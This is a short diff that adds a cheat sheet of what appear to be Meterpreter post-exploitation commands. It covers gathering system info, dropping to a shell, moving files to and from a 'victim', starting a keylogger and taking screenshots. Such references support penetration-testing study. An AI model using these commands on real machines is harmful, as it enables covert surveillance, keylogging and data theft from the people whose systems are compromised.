@@ -1,0 +1,7 @@
+sysinfo            # Show OS and system info
+getuid             # Show current user
+shell              # Drop to standard shell
+download <file>    # Download file from victim
+upload <file>      # Upload file to victim
+keyscan_start      # Start keylogger
+screenshot         # Take a screenshot
